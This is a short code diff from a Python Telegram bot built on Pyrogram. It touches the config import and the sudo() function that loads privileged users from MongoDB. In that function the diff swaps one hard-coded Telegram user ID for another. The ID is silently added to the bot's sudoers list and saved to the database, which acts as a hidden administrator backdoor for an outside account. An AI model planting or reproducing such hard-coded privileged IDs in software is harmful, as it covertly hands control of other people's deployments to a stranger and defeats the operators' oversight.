@@ -4,7 +4,7 @@ import time
 import heroku3
 from pyrogram import filters
 
-from Nobita import config
+import config
 from Nobita.core.mongo import pymongodb
 
 from .logging import LOGGER
@@ -56,7 +56,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(1439222689)
+                sudoers.append(5275980328)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
